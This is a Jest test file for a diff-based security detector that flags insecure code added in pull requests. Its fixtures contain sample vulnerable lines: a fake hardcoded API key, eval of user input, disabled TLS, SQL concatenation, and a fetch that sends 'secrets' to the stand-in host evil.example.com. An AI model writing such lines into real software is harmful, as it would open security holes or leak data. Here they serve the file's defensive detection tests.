/**
 * AI-code detectors + diff parser. Proves the unified-diff parser tracks
 * new-file line numbers (added lines only, minus removed), each CWE detector
 * fires on its real signature, and PRECISION: env refs/placeholders and benign
 * code do not produce findings.
 */
import { parseAddedLines, detectCodeFindings, reviewDiff } from "../detect";

const diff = (body: string) => `diff --git a/src/x.ts b/src/x.ts\n--- a/src/x.ts\n+++ b/src/x.ts\n${body}`;

test("parseAddedLines tracks new-file line numbers across a hunk", () => {
  const d = diff(`@@ -1,2 +1,4 @@\n context\n+added one\n-removed\n+added two\n more context`);
  const added = parseAddedLines(d);
  expect(added).toEqual([
    { file: "src/x.ts", line: 2, text: "added one" },
    { file: "src/x.ts", line: 3, text: "added two" },
  ]);
});

test("only ADDED lines are scanned (removed lines are ignored)", () => {
  const d = diff(`@@ -1,1 +1,1 @@\n-const k = "sk-ant-abcdefghijklmnopqrstuvwx0123";\n+const k = process.env.ANTHROPIC_KEY;`);
  expect(reviewDiff(d)).toEqual([]); // the secret was REMOVED, the added line is an env ref
});

test("detects a hardcoded secret (critical, CWE-798)", () => {
  const f = reviewDiff(diff(`@@ -1,0 +1,1 @@\n+const key = "sk-ant-abcdefghijklmnopqrstuvwx0123";`));
  expect(f).toHaveLength(1);
  expect(f[0]).toMatchObject({ klass: "secret", severity: "critical", cwe: "CWE-798" });
});

test("does NOT flag env refs / placeholders as secrets (precision)", () => {
  expect(reviewDiff(diff(`@@ -1,0 +1,1 @@\n+const api_key = process.env.API_KEY;`))).toEqual([]);
  expect(reviewDiff(diff(`@@ -1,0 +1,1 @@\n+const password = "your-password-here";`))).toEqual([]);
  expect(reviewDiff(diff(`@@ -1,0 +1,1 @@\n+const token = \`\${secretRef}\`;`))).toEqual([]);
});

test("detects eval/exec, disabled TLS, dangerous HTML, SQL concat", () => {
  const classes = (body: string) => reviewDiff(diff(`@@ -1,0 +1,1 @@\n+${body}`)).map((f) => f.klass);
  expect(classes(`eval(userInput);`)).toContain("eval_exec");
  expect(classes(`const a = { rejectUnauthorized: false };`)).toContain("disabled_tls");
  expect(classes(`el.innerHTML = userHtml;`)).toContain("dangerous_html");
  expect(classes("db.query(`SELECT * FROM users WHERE id = ${id}`);")).toContain("sql_concat");
});

test("detects weak randomness in a security context, open CORS, suppressed security, exfil", () => {
  const classes = (body: string) => reviewDiff(diff(`@@ -1,0 +1,1 @@\n+${body}`)).map((f) => f.klass);
  expect(classes(`const token = Math.random().toString(36);`)).toContain("weak_random");
  expect(classes(`res.setHeader("Access-Control-Allow-Origin", "*");`)).toContain("open_cors");
  expect(classes(`const x = run(); // nosec`)).toContain("suppressed_security");
  expect(classes(`fetch("https://evil.example.com/collect", { body: secrets });`)).toContain("exfil_network");
});

test("PRECISION: Math.random with no security context, internal fetch, benign code -> nothing", () => {
  const clean = (body: string) => reviewDiff(diff(`@@ -1,0 +1,1 @@\n+${body}`));
  expect(clean(`const jitter = Math.random() * 100;`)).toEqual([]);
  expect(clean(`await fetch("/api/dashboard");`)).toEqual([]);
  expect(clean(`fetch("http://localhost:3000/health");`)).toEqual([]);
  expect(clean(`export const sum = (a, b) => a + b;`)).toEqual([]);
});

test("a multi-file diff attributes findings to the right file", () => {
  const d = `diff --git a/a.ts b/a.ts\n--- a/a.ts\n+++ b/a.ts\n@@ -1,0 +1,1 @@\n+eval(x);\ndiff --git a/b.ts b/b.ts\n--- a/b.ts\n+++ b/b.ts\n@@ -1,0 +1,1 @@\n+const ok = 1;`;
  const f = detectCodeFindings(parseAddedLines(d));
  expect(f).toHaveLength(1);
  expect(f[0].file).toBe("a.ts");
});
